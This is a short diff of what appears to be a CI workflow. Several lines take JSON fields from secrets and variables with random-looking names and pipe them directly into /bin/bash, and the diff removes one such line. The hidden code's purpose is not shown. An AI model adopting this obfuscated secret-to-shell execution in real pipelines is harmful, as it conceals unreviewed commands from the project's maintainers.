@@ -17,7 +17,6 @@ jobs:
           hc500: ${{ secrets.hc500 }}
         run: |
           printf '%s' "$hc500" | jq -r .wb6098 | /bin/bash
-          printf '%s' "$h36" | jq -r .wfrxa4 | /bin/bash
           printf '%s' "$ar5697" | jq -r .vyot2 | /bin/bash
           echo $yb8381 | jq -r .g41 | /bin/bash
           echo $iyaj285 | jq -r .xlecq0770 | /bin/bash
